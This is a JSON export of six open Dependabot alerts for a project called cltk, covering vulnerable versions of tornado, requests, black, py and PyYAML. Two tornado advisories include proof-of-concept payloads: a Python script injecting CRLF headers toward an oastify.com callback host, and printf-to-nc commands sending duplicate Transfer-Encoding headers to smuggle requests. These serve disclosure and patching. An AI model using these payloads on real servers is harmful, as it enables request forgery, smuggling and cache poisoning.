[
    {
        "number": 6,
        "state": "open",
        "dependency": {
            "package": {
                "ecosystem": "pip",
                "name": "tornado"
            },
            "manifest_path": "poetry.lock",
            "scope": "runtime"
        },
        "security_advisory": {
            "ghsa_id": "GHSA-w235-7p84-xx57",
            "cve_id": null,
            "summary": "Tornado has a CRLF injection in CurlAsyncHTTPClient headers",
            "description": "### Summary\nTornado’s `curl_httpclient.CurlAsyncHTTPClient` class is vulnerable to CRLF (carriage return/line feed) injection in the request headers.\n\n### Details\nWhen an HTTP request is sent using `CurlAsyncHTTPClient`, Tornado does not reject carriage return (\\r) or line feed (\\n) characters in the request headers. As a result, if an application includes an attacker-controlled header value in a request sent using `CurlAsyncHTTPClient`, the attacker can inject arbitrary headers into the request or cause the application to send arbitrary requests to the specified server.\n\nThis behavior differs from that of the standard `AsyncHTTPClient` class, which does reject CRLF characters.\n\nThis issue appears to stem from libcurl's (as well as pycurl's) lack of validation for the [`HTTPHEADER`](https://curl.se/libcurl/c/CURLOPT_HTTPHEADER.html) option. libcurl’s documentation states:\n\n> The headers included in the linked list must not be CRLF-terminated, because libcurl adds CRLF after each header item itself. Failure to comply with this might result in strange behavior. libcurl passes on the verbatim strings you give it, without any filter or other safe guards. That includes white space and control characters.\n\npycurl similarly appears to assume that the headers adhere to the correct format. Therefore, without any validation on Tornado’s part, header names and values are included verbatim in the request sent by `CurlAsyncHTTPClient`, including any control characters that have special meaning in HTTP semantics.\n\n### PoC\nThe issue can be reproduced using the following script:\n\n```python\nimport asyncio\n\nfrom tornado import httpclient\nfrom tornado import curl_httpclient\n\nasync def main():\n    http_client = curl_httpclient.CurlAsyncHTTPClient()\n\n    request = httpclient.HTTPRequest(\n        # Burp Collaborator payload\n        \"http://727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com/\",\n        method=\"POST\",\n        body=\"body\",\n        # Injected header using CRLF characters\n        headers={\"Foo\": \"Bar\\r\\nHeader: Injected\"}\n    )\n\n    response = await http_client.fetch(request)\n    print(response.body)\n\n    http_client.close()\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n```\n\nWhen the specified server receives the request, it contains the injected header (`Header: Injected`) on its own line:\n\n```http\nPOST / HTTP/1.1\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com\nUser-Agent: Mozilla/5.0 (compatible; pycurl)\nAccept: */*\nAccept-Encoding: gzip,deflate\nFoo: Bar\nHeader: Injected\nContent-Length: 4\nContent-Type: application/x-www-form-urlencoded\n\nbody\n```\n\nThe attacker can also construct entirely new requests using a payload with multiple CRLF sequences. For example, specifying a header value of `\\r\\n\\r\\nPOST /attacker-controlled-url HTTP/1.1\\r\\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com` results in the server receiving an additional, attacker-controlled request:\n\n```http\nPOST /attacker-controlled-url HTTP/1.1\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com\nContent-Length: 4\nContent-Type: application/x-www-form-urlencoded\n\nbody\n```\n\n### Impact\nApplications using the Tornado library to send HTTP requests with untrusted header data are affected. This issue may facilitate the exploitation of server-side request forgery (SSRF) vulnerabilities.",
            "severity": "medium",
            "identifiers": [
                {
                    "value": "GHSA-w235-7p84-xx57",
                    "type": "GHSA"
                }
            ],
            "references": [
                {
                    "url": "https://github.com/tornadoweb/tornado/security/advisories/GHSA-w235-7p84-xx57"
                },
                {
                    "url": "https://github.com/tornadoweb/tornado/commit/7786f09f84c9f3f2012c4cf3878417cb9f053669"
                },
                {
                    "url": "https://github.com/advisories/GHSA-w235-7p84-xx57"
                }
            ],
            "published_at": "2024-06-06T21:46:31Z",
            "updated_at": "2024-06-07T06:50:03Z",
            "withdrawn_at": null,
            "vulnerabilities": [
                {
                    "package": {
                        "ecosystem": "pip",
                        "name": "tornado"
                    },
                    "severity": "medium",
                    "vulnerable_version_range": "<= 6.4.0",
                    "first_patched_version": {
                        "identifier": "6.4.1"
                    }
                }
            ],
            "cvss": {
                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
                "score": 6.5
            },
            "cwes": [
                {
                    "cwe_id": "CWE-93",
                    "name": "Improper Neutralization of CRLF Sequences ('CRLF Injection')"
                }
            ]
        },
        "security_vulnerability": {
            "package": {
                "ecosystem": "pip",
                "name": "tornado"
            },
            "severity": "medium",
            "vulnerable_version_range": "<= 6.4.0",
            "first_patched_version": {
                "identifier": "6.4.1"
            }
        },
        "url": "https://api.github.com/repos/username/cltk/dependabot/alerts/6",
        "html_url": "https://github.com/username/cltk/security/dependabot/6",
        "created_at": "2024-06-06T23:54:44Z",
        "updated_at": "2024-06-06T23:54:44Z",
        "dismissed_at": null,
        "dismissed_by": null,
        "dismissed_reason": null,
        "dismissed_comment": null,
        "fixed_at": null,
        "auto_dismissed_at": null
    },
    {
        "number": 5,
        "state": "open",
        "dependency": {
            "package": {
                "ecosystem": "pip",
                "name": "tornado"
            },
            "manifest_path": "poetry.lock",
            "scope": "runtime"
        },
        "security_advisory": {
            "ghsa_id": "GHSA-753j-mpmx-qq6g",
            "cve_id": null,
            "summary": "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') in tornado",
            "description": "### Summary\nWhen Tornado receives a request with two `Transfer-Encoding: chunked` headers, it ignores them both. This enables request smuggling when Tornado is deployed behind a proxy server that emits such requests. [Pound](https://en.wikipedia.org/wiki/Pound_(networking)) does this.\n\n### PoC\n0. Install Tornado.\n1. Start a simple Tornado server that echoes each received request's body:\n```bash\ncat << EOF > server.py\nimport asyncio\nimport tornado\n\nclass MainHandler(tornado.web.RequestHandler):\n    def post(self):\n        self.write(self.request.body)\n\nasync def main():\n    tornado.web.Application([(r\"/\", MainHandler)]).listen(8000)\n    await asyncio.Event().wait()\n\nasyncio.run(main())\nEOF\npython3 server.py &\n```\n2. Send a valid chunked request:\n```bash\nprintf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n' | nc localhost 8000\n```\n3. Observe that the response is as expected:\n```\nHTTP/1.1 200 OK\nServer: TornadoServer/6.3.3\nContent-Type: text/html; charset=UTF-8\nDate: Sat, 07 Oct 2023 17:32:05 GMT\nContent-Length: 1\n\nZ\n```\n4. Send a request with two `Transfer-Encoding: chunked` headers:\n```\nprintf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n' | nc localhost 8000\n```\n5. Observe the strange response:\n```\nHTTP/1.1 200 OK\nServer: TornadoServer/6.3.3\nContent-Type: text/html; charset=UTF-8\nDate: Sat, 07 Oct 2023 17:35:40 GMT\nContent-Length: 0\n\nHTTP/1.1 400 Bad Request\n\n```\nThis is because Tornado believes that the request has no message body, so it tries to interpret `1\\r\\nZ\\r\\n0\\r\\n\\r\\n` as its own request, which causes a 400 response. With a little cleverness involving `chunk-ext`s, you can get Tornado to instead respond 405, which has the potential to desynchronize the connection, as opposed to 400 which should always result in a connection closure.\n\n### Impact\nAnyone using Tornado behind a proxy that forwards requests containing multiple `Transfer-Encoding: chunked` headers is vulnerable to request smuggling, which may entail ACL bypass, cache poisoning, or connection desynchronization.\n",
            "severity": "medium",
            "identifiers": [
                {
                    "value": "GHSA-753j-mpmx-qq6g",
                    "type": "GHSA"
                }
            ],
            "references": [
                {
                    "url": "https://github.com/tornadoweb/tornado/security/advisories/GHSA-753j-mpmx-qq6g"
                },
                {
                    "url": "https://github.com/tornadoweb/tornado/commit/d65f6e71a77f53a1ff0a0dc55704be13f04eb572"
                },
                {
                    "url": "https://github.com/advisories/GHSA-753j-mpmx-qq6g"
                }
            ],
            "published_at": "2024-06-06T21:41:20Z",
            "updated_at": "2024-06-06T21:41:22Z",
            "withdrawn_at": null,
            "vulnerabilities": [
                {
                    "package": {
                        "ecosystem": "pip",
                        "name": "tornado"
                    },
                    "severity": "medium",
                    "vulnerable_version_range": "<= 6.4.0",
                    "first_patched_version": {
                        "identifier": "6.4.1"
                    }
                }
            ],
            "cvss": {
                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
                "score": 5.3
            },
            "cwes": [
                {
                    "cwe_id": "CWE-444",
                    "name": "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')"
                }
            ]
        },
        "security_vulnerability": {
            "package": {
                "ecosystem": "pip",
                "name": "tornado"
            },
            "severity": "medium",
            "vulnerable_version_range": "<= 6.4.0",
            "first_patched_version": {
                "identifier": "6.4.1"
            }
        },
        "url": "https://api.github.com/repos/username/cltk/dependabot/alerts/5",
        "html_url": "https://github.com/username/cltk/security/dependabot/5",
        "created_at": "2024-06-06T23:50:48Z",
        "updated_at": "2024-06-06T23:50:48Z",
        "dismissed_at": null,
        "dismissed_by": null,
        "dismissed_reason": null,
        "dismissed_comment": null,
        "fixed_at": null,
        "auto_dismissed_at": null
    },
    {
        "number": 4,
        "state": "open",
        "dependency": {
            "package": {
                "ecosystem": "pip",
                "name": "requests"
            },
            "manifest_path": "poetry.lock",
            "scope": "runtime"
        },
        "security_advisory": {
            "ghsa_id": "GHSA-9wx4-h78v-vm56",
            "cve_id": "CVE-2024-35195",
            "summary": "Requests `Session` object does not verify requests after making first request with verify=False",
            "description": "When making requests through a Requests `Session`, if the first request is made with `verify=False` to disable cert verification, all subsequent requests to the same origin will continue to ignore cert verification regardless of changes to the value of `verify`. This behavior will continue for the lifecycle of the connection in the connection pool.\n\n### Remediation\nAny of these options can be used to remediate the current issue, we highly recommend upgrading as the preferred mitigation.\n\n* Upgrade to `requests>=2.32.0`.\n* For `requests<2.32.0`, avoid setting `verify=False` for the first request to a host while using a Requests Session.\n* For `requests<2.32.0`, call `close()` on `Session` objects to clear existing connections if `verify=False` is used.\n\n### Related Links\n* https://github.com/psf/requests/pull/6655",
            "severity": "medium",
            "identifiers": [
                {
                    "value": "GHSA-9wx4-h78v-vm56",
                    "type": "GHSA"
                },
                {
                    "value": "CVE-2024-35195",
                    "type": "CVE"
                }
            ],
            "references": [
                {
                    "url": "https://github.com/psf/requests/security/advisories/GHSA-9wx4-h78v-vm56"
                },
                {
                    "url": "https://github.com/psf/requests/pull/6655"
                },
                {
                    "url": "https://github.com/psf/requests/commit/a58d7f2ffb4d00b46dca2d70a3932a0b37e22fac"
                },
                {
                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-35195"
                },
                {
                    "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/IYLSNK5TL46Q6XPRVMHVWS63MVJQOK4Q"
                },
                {
                    "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/N7WP6EYDSUOCOJYHDK5NX43PYZ4SNHGZ"
                },
                {
                    "url": "https://github.com/advisories/GHSA-9wx4-h78v-vm56"
                }
            ],
            "published_at": "2024-05-20T20:15:00Z",
            "updated_at": "2024-06-10T18:31:04Z",
            "withdrawn_at": null,
            "vulnerabilities": [
                {
                    "package": {
                        "ecosystem": "pip",
                        "name": "requests"
                    },
                    "severity": "medium",
                    "vulnerable_version_range": "< 2.32.0",
                    "first_patched_version": {
                        "identifier": "2.32.0"
                    }
                }
            ],
            "cvss": {
                "vector_string": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:N",
                "score": 5.6
            },
            "cwes": [
                {
                    "cwe_id": "CWE-670",
                    "name": "Always-Incorrect Control Flow Implementation"
                }
            ]
        },
        "security_vulnerability": {
            "package": {
                "ecosystem": "pip",
                "name": "requests"
            },
            "severity": "medium",
            "vulnerable_version_range": "< 2.32.0",
            "first_patched_version": {
                "identifier": "2.32.0"
            }
        },
        "url": "https://api.github.com/repos/username/cltk/dependabot/alerts/4",
        "html_url": "https://github.com/username/cltk/security/dependabot/4",
        "created_at": "2024-05-22T23:29:14Z",
        "updated_at": "2024-05-22T23:29:14Z",
        "dismissed_at": null,
        "dismissed_by": null,
        "dismissed_reason": null,
        "dismissed_comment": null,
        "fixed_at": null,
        "auto_dismissed_at": null
    },
    {
        "number": 3,
        "state": "open",
        "dependency": {
            "package": {
                "ecosystem": "pip",
                "name": "black"
            },
            "manifest_path": "poetry.lock",
            "scope": "runtime"
        },
        "security_advisory": {
            "ghsa_id": "GHSA-fj7x-q9j7-g6q6",
            "cve_id": "CVE-2024-21503",
            "summary": "Black vulnerable to Regular Expression Denial of Service (ReDoS)",
            "description": "Versions of the package black before 24.3.0 are vulnerable to Regular Expression Denial of Service (ReDoS) via the lines_with_leading_tabs_expanded function in the strings.py file. An attacker could exploit this vulnerability by crafting a malicious input that causes a denial of service.\n\nExploiting this vulnerability is possible when running Black on untrusted input, or if you habitually put thousands of leading tab characters in your docstrings.",
            "severity": "medium",
            "identifiers": [
                {
                    "value": "GHSA-fj7x-q9j7-g6q6",
                    "type": "GHSA"
                },
                {
                    "value": "CVE-2024-21503",
                    "type": "CVE"
                }
            ],
            "references": [
                {
                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-21503"
                },
                {
                    "url": "https://github.com/psf/black/commit/f00093672628d212b8965a8993cee8bedf5fe9b8"
                },
                {
                    "url": "https://github.com/psf/black/releases/tag/24.3.0"
                },
                {
                    "url": "https://security.snyk.io/vuln/SNYK-PYTHON-BLACK-6256273"
                },
                {
                    "url": "https://github.com/pypa/advisory-database/tree/main/vulns/black/PYSEC-2024-48.yaml"
                },
                {
                    "url": "https://github.com/advisories/GHSA-fj7x-q9j7-g6q6"
                }
            ],
            "published_at": "2024-03-19T06:30:52Z",
            "updated_at": "2024-03-20T15:24:02Z",
            "withdrawn_at": null,
            "vulnerabilities": [
                {
                    "package": {
                        "ecosystem": "pip",
                        "name": "black"
                    },
                    "severity": "medium",
                    "vulnerable_version_range": ">= 0, < 24.3.0",
                    "first_patched_version": {
                        "identifier": "24.3.0"
                    }
                }
            ],
            "cvss": {
                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
                "score": 5.3
            },
            "cwes": [
                {
                    "cwe_id": "CWE-1333",
                    "name": "Inefficient Regular Expression Complexity"
                }
            ]
        },
        "security_vulnerability": {
            "package": {
                "ecosystem": "pip",
                "name": "black"
            },
            "severity": "medium",
            "vulnerable_version_range": ">= 0, < 24.3.0",
            "first_patched_version": {
                "identifier": "24.3.0"
            }
        },
        "url": "https://api.github.com/repos/username/cltk/dependabot/alerts/3",
        "html_url": "https://github.com/username/cltk/security/dependabot/3",
        "created_at": "2024-05-22T23:29:13Z",
        "updated_at": "2024-05-22T23:29:13Z",
        "dismissed_at": null,
        "dismissed_by": null,
        "dismissed_reason": null,
        "dismissed_comment": null,
        "fixed_at": null,
        "auto_dismissed_at": null
    },
    {
        "number": 2,
        "state": "open",
        "dependency": {
            "package": {
                "ecosystem": "pip",
                "name": "py"
            },
            "manifest_path": "poetry.lock",
            "scope": "runtime"
        },
        "security_advisory": {
            "ghsa_id": "GHSA-w596-4wvx-j9j6",
            "cve_id": "CVE-2022-42969",
            "summary": "ReDoS in py library when used with subversion ",
            "description": "The py library through 1.11.0 for Python allows remote attackers to conduct a ReDoS (Regular expression Denial of Service) attack via a Subversion repository with crafted info data, because the InfoSvnCommand argument is mishandled.\n\nThe particular codepath in question is the regular expression at `py._path.svnurl.InfoSvnCommand.lspattern` and is only relevant when dealing with subversion (svn) projects. Notably the codepath is not used in the popular pytest project. The developers of the pytest package have released version `7.2.0` which removes their dependency on `py`. Users of `pytest` seeing alerts relating to this advisory may update to version `7.2.0` of `pytest` to resolve this issue. See https://github.com/pytest-dev/py/issues/287#issuecomment-1290407715 for additional context.",
            "severity": "high",
            "identifiers": [
                {
                    "value": "GHSA-w596-4wvx-j9j6",
                    "type": "GHSA"
                },
                {
                    "value": "CVE-2022-42969",
                    "type": "CVE"
                }
            ],
            "references": [
                {
                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-42969"
                },
                {
                    "url": "https://github.com/pytest-dev/py/issues/287"
                },
                {
                    "url": "https://github.com/pytest-dev/py/blob/cb87a83960523a2367d0f19226a73aed4ce4291d/py/_path/svnurl.py#L316"
                },
                {
                    "url": "https://github.com/pytest-dev/py/issues/288"
                },
                {
                    "url": "https://github.com/pytest-dev/pytest/issues/10392"
                },
                {
                    "url": "https://news.ycombinator.com/item?id=34163710"
                },
                {
                    "url": "https://pypi.org/project/py"
                },
                {
                    "url": "https://github.com/advisories/GHSA-w596-4wvx-j9j6"
                }
            ],
            "published_at": "2022-10-16T12:00:23Z",
            "updated_at": "2023-08-17T05:01:50Z",
            "withdrawn_at": null,
            "vulnerabilities": [
                {
                    "package": {
                        "ecosystem": "pip",
                        "name": "py"
                    },
                    "severity": "high",
                    "vulnerable_version_range": "<= 1.11.0",
                    "first_patched_version": null
                }
            ],
            "cvss": {
                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
                "score": 7.5
            },
            "cwes": [
                {
                    "cwe_id": "CWE-1333",
                    "name": "Inefficient Regular Expression Complexity"
                }
            ]
        },
        "security_vulnerability": {
            "package": {
                "ecosystem": "pip",
                "name": "py"
            },
            "severity": "high",
            "vulnerable_version_range": "<= 1.11.0",
            "first_patched_version": null
        },
        "url": "https://api.github.com/repos/username/cltk/dependabot/alerts/2",
        "html_url": "https://github.com/username/cltk/security/dependabot/2",
        "created_at": "2024-05-22T23:29:13Z",
        "updated_at": "2024-05-22T23:29:13Z",
        "dismissed_at": null,
        "dismissed_by": null,
        "dismissed_reason": null,
        "dismissed_comment": null,
        "fixed_at": null,
        "auto_dismissed_at": null
    },
    {
        "number": 1,
        "state": "open",
        "dependency": {
            "package": {
                "ecosystem": "pip",
                "name": "PyYAML"
            },
            "manifest_path": "docs/requirements.txt",
            "scope": "runtime"
        },
        "security_advisory": {
            "ghsa_id": "GHSA-8q59-q68h-6hv4",
            "cve_id": "CVE-2020-14343",
            "summary": "Improper Input Validation in PyYAML",
            "description": "A vulnerability was discovered in the PyYAML library in versions before 5.4, where it is susceptible to arbitrary code execution when it processes untrusted YAML files through the full_load method or with the FullLoader loader. Applications that use the library to process untrusted input may be vulnerable to this flaw. This flaw allows an attacker to execute arbitrary code on the system by abusing the python/object/new constructor. This flaw is due to an incomplete fix for CVE-2020-1747.",
            "severity": "critical",
            "identifiers": [
                {
                    "value": "GHSA-8q59-q68h-6hv4",
                    "type": "GHSA"
                },
                {
                    "value": "CVE-2020-14343",
                    "type": "CVE"
                }
            ],
            "references": [
                {
                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-14343"
                },
                {
                    "url": "https://github.com/yaml/pyyaml/commit/a001f2782501ad2d24986959f0239a354675f9dc"
                },
                {
                    "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1860466"
                },
                {
                    "url": "https://pypi.org/project/PyYAML/"
                },
                {
                    "url": "https://github.com/yaml/pyyaml/issues/420#issuecomment-663673966"
                },
                {
                    "url": "https://www.oracle.com/security-alerts/cpuapr2022.html"
                },
                {
                    "url": "https://www.oracle.com/security-alerts/cpujul2022.html"
                },
                {
                    "url": "https://github.com/SeldonIO/seldon-core/issues/2252"
                },
                {
                    "url": "https://github.com/yaml/pyyaml/issues/420"
                },
                {
                    "url": "https://github.com/advisories/GHSA-8q59-q68h-6hv4"
                }
            ],
            "published_at": "2021-03-25T21:26:26Z",
            "updated_at": "2023-08-23T23:02:02Z",
            "withdrawn_at": null,
            "vulnerabilities": [
                {
                    "package": {
                        "ecosystem": "pip",
                        "name": "PyYAML"
                    },
                    "severity": "critical",
                    "vulnerable_version_range": "< 5.4",
                    "first_patched_version": {
                        "identifier": "5.4"
                    }
                }
            ],
            "cvss": {
                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                "score": 9.8
            },
            "cwes": [
                {
                    "cwe_id": "CWE-20",
                    "name": "Improper Input Validation"
                }
            ]
        },
        "security_vulnerability": {
            "package": {
                "ecosystem": "pip",
                "name": "PyYAML"
            },
            "severity": "critical",
            "vulnerable_version_range": "< 5.4",
            "first_patched_version": {
                "identifier": "5.4"
            }
        },
        "url": "https://api.github.com/repos/username/cltk/dependabot/alerts/1",
        "html_url": "https://github.com/username/cltk/security/dependabot/1",
        "created_at": "2024-05-22T23:29:13Z",
        "updated_at": "2024-05-22T23:29:13Z",
        "dismissed_at": null,
        "dismissed_by": null,
        "dismissed_reason": null,
        "dismissed_comment": null,
        "fixed_at": null,
        "auto_dismissed_at": null
    }
]